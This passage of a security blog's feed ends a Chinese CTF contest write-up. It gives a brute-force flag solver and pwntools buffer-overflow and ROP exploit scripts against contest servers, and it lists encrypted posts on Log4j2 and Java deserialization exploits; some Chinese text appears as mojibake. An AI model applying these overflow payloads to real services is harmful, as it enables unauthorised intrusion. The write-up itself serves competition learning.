class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1257</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (a1 | <span class="number">0x8E03BEC3</span>) - <span class="number">3</span> * (a1 &amp; <span class="number">0x71FC413C</span>) + a1 == <span class="number">-1876131848</span> )</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_12A4</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x10000000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4</span> * ((~a1 &amp; <span class="number">0xA8453437</span>) + <span class="number">2</span> * ~(~a1 | <span class="number">0xA8453437</span>))</span><br><span class="line">     + <span class="number">-3</span> * (~a1 | <span class="number">0xA8453437</span>)</span><br><span class="line">     + <span class="number">3</span> * ~(a1 | <span class="number">0xA8453437</span>)</span><br><span class="line">     - (<span class="number">-10</span> * (a1 &amp; <span class="number">0xA8453437</span>)</span><br><span class="line">      + (a1 ^ <span class="number">0xA8453437</span>)) == <span class="number">551387557</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1346</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x10000000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">11</span> * ~(a1 ^ <span class="number">0xE33B67BD</span>)</span><br><span class="line">     + <span class="number">4</span> * ~(~a1 | <span class="number">0xE33B67BD</span>)</span><br><span class="line">     - (<span class="number">6</span> * (a1 &amp; <span class="number">0xE33B67BD</span>)</span><br><span class="line">      + <span class="number">12</span> * ~(a1 | <span class="number">0xE33B67BD</span>))</span><br><span class="line">     + <span class="number">3</span> * (a1 &amp; <span class="number">0xD2C7FC0C</span>)</span><br><span class="line">     + <span class="number">-5</span> * a1</span><br><span class="line">     - <span class="number">2</span> * ~(a1 | <span class="number">0xD2C7FC0C</span>)</span><br><span class="line">     + ~(a1 | <span class="number">0x2D3803F3</span>)</span><br><span class="line">     + <span class="number">4</span> * (a1 &amp; <span class="number">0x2D3803F3</span>)</span><br><span class="line">     - <span class="number">-2</span> * (a1 | <span class="number">0x2D3803F3</span>) == <span class="number">0xCE1066DC</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">0xADB1D018</span>LL;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> b = a+<span class="number">0x36145344</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = <span class="built_in">sub_1257</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = <span class="built_in">sub_12A4</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = <span class="built_in">sub_1346</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;e3c6235c-05d9434d-04b1edf3-04034083&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><ul><li>ret2text</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob07.contest.pku.edu.cn&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Please input your token: &#x27;</span>)</span><br><span class="line">p.sendline(b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Enter your username: &#x27;</span>)</span><br><span class="line">p.sendline(b<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = b<span class="string">&#x27;!@#$%^&amp;*()_+&#x27;</span></span><br><span class="line"><span class="built_in">offset</span>=<span class="number">0x38</span> - <span class="built_in">len</span>(x)</span><br><span class="line">payload = x + b<span class="string">&#x27;\x00&#x27;</span> * <span class="built_in">offset</span> + p64(<span class="number">0x40117A</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Enter the password: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>å¯†ç å¤„è¾“å…¥å­—ç¬¦è¿‡é•¿æº¢å‡ºï¼Œå¯†ç è‡ªå·±å‡ºæ¥äº†<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996681718-deba3f05-beb0-4cd5-9e82-68eaecfb43a3.png#averageHue=%230a0908&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=813&amp;id=u0a997292&amp;originHeight=1219&amp;originWidth=2530&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=222241&amp;status=done&amp;style=none&amp;taskId=u01241050-9a4a-48ce-b0b3-aedfd42c4f8&amp;title=&amp;width=1686.6666666666667" alt="image.png"><br>elfæ–‡ä»¶æ³„éœ²ï¼Œä½¿ç”¨è„šæœ¬æå–</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob04.contest.pku.edu.cn&#x27;</span>, <span class="number">10004</span>, level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Please input your token: &#x27;</span>,</span><br><span class="line">                b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Username:&#x27;</span>, b<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Password:&#x27;</span>, b<span class="string">&#x27;1q2w3e4r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">data</span> = p.recvall()</span><br><span class="line">flag = <span class="keyword">data</span>.find(b<span class="string">&#x27;\x7fELF&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> flag ==-<span class="number">1</span>:</span><br><span class="line">    datas = <span class="keyword">data</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    datas = <span class="keyword">data</span>[flag:]</span><br><span class="line"></span><br><span class="line">with <span class="keyword">open</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(datas)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æå–æˆåŠŸï¼Œæ‰¾åˆ°åé—¨<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996795308-bf233b5b-65dd-4af5-b558-fe74bf5ea687.png#averageHue=%23f9f7f5&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=121&amp;id=u6fa22c66&amp;originHeight=181&amp;originWidth=799&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=13303&amp;status=done&amp;style=none&amp;taskId=ub2c18f58-f686-4613-b1c0-efeb1434234&amp;title=&amp;width=532.6666666666666" alt="798c4c64bc527cfdfb112297a2aba3a.png"><br>æ‰¾gadgets<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996814489-e62ce271-ef49-48db-b399-d15b31f702e4.png#averageHue=%23300b25&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=85&amp;id=ub9c3ffa3&amp;originHeight=128&amp;originWidth=684&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=16770&amp;status=done&amp;style=none&amp;taskId=u188da057-fd77-40da-a627-cf123ca2a87&amp;title=&amp;width=456" alt="439b7b4556526a0ec73c101ae0b03e5b_.png"></p><ul><li>exp</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="emphasis">&#x27;prob04.contest.pku.edu.cn&#x27;</span>, 10004, level=<span class="emphasis">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b&#x27;Please input your token: <span class="emphasis">&#x27;,</span></span><br><span class="line"><span class="emphasis">                b&#x27;</span>468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;Username: <span class="emphasis">&#x27;, &#x27;</span>admin&#x27;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"><span class="section">Gadgets information</span></span><br><span class="line"><span class="section">============================================================</span></span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">0x0000000000401359 : ret 0x1be</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload = b&#x27;a&#x27; * 40 <span class="code">+ b&#x27;\x00&#x27; * (41 - 40) +</span> b&#x27;b&#x27; * (48 <span class="code">+ 96 - 41) +</span> p64(0x40101a) * 3 + p64(0x40127e)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;Password: <span class="emphasis">&#x27;, payload)</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"></span>p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714998007875-ba0fadb1-4b37-4774-988e-40dc7a35e266.png#averageHue=%2391959a&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=349&amp;id=ub001c975&amp;originHeight=524&amp;originWidth=1194&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=44000&amp;status=done&amp;style=none&amp;taskId=uf5f3f913-75d1-46c3-8d3f-c017298af16&amp;title=&amp;width=796" alt="image.png"></p>]]></content>
    
    
    <summary type="html">é«˜æ ¡ç½‘ç»œå®‰å…¨ç®¡ç†è¿ç»´èµ› 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://www.fomal.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.fomal.cc/tags/CTF/"/>
    
    <category term="Competition" scheme="https://www.fomal.cc/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2</title>
    <link href="https://www.fomal.cc/posts/6cdb73.html"/>
    <id>https://www.fomal.cc/posts/6cdb73.html</id>
    <published>2024-03-15T12:42:09.000Z</published>
    <updated>2024-06-15T12:49:13.548Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" data-hmacdigest="2e7fae38d107ee4625e24d45b2f0e491c74a88e07b7ffccd561ec03c5375bc90">fe693106a95ef61794da4c5f123204e8d3c00f148706c6a206ff03754bd2b2aa9d815501f8412c47ad5b63048142b7d09da07c934a6c60afb063b71ef21c63d3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">å†…å®¹è¿˜æ²¡å†™å®Œï¼Œéœ€è¦å¯†ç æ‰èƒ½æŸ¥çœ‹ï¼</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Log4j2 æ¼æ´å¤ç°</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://www.fomal.cc/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Java" scheme="https://www.fomal.cc/tags/Java/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="https://www.fomal.cc/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Javaååºåˆ—åŒ–ä¹‹Fastjson</title>
    <link href="https://www.fomal.cc/posts/a8f06b6c.html"/>
    <id>https://www.fomal.cc/posts/a8f06b6c.html</id>
    <published>2024-02-15T11:54:08.000Z</published>
    <updated>2024-06-15T12:07:05.093Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">å†…å®¹è¿˜æ²¡å†™å®Œï¼Œéœ€è¦å¯†ç æ‰èƒ½æŸ¥çœ‹ï¼</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Javaååºåˆ—åŒ– Fastjsonç¯‡</summary>
    
    
    
    <category term="Java" scheme="https://www.fomal.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://www.fomal.cc/tags/Java/"/>
    
    <category term="Fastjson" scheme="https://www.fomal.cc/tags/Fastjson/"/>
    
  </entry>
  
  <entry>
    <title>Javaååºåˆ—åŒ–ä¹‹Shiro</title>
    <link href="https://www.fomal.cc/posts/58285500.html"/>
    <id>https://www.fomal.cc/posts/58285500.html</id>
    <published>2024-01-30T11:53:56.000Z</published>
    <updated>2024-06-15T12:07:05.089Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">å†…å®¹è¿˜æ²¡å†™å®Œï¼Œéœ€è¦å¯†ç æ‰èƒ½æŸ¥çœ‹ï¼</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Javaååºåˆ—åŒ– Shiroç¯‡</summary>
    
    
    
    <category term="Java" scheme="https://www.fomal.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://www.fomal.cc/tags/Java/"/>
    
    <category term="Shiro" scheme="https://www.fomal.cc/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>Javaååºåˆ—åŒ–ä¹‹CCé“¾</title>
    <link href="https://www.fomal.cc/posts/fba70aa7.html"/>
    <id>https://www.fomal.cc/posts/fba70aa7.html</id>
    <published>2024-01-15T07:26:59.000Z</published>
    <updated>2024-06-15T12:01:48.813Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">å†…å®¹è¿˜æ²¡å†™å®Œï¼Œéœ€è¦å¯†ç æ‰èƒ½æŸ¥çœ‹ï¼</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Javaååºåˆ—åŒ– Commons-Collectionsç¯‡</summary>
    
    
    
    <category term="Java" scheme="https://www.fomal.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://www.fomal.cc/tags/Java/"/>
    
    <category term="CCé“¾" scheme="https://www.fomal.cc/tags/CC%E9%93%BE/"/>
    
  </entry>
  
</feed>
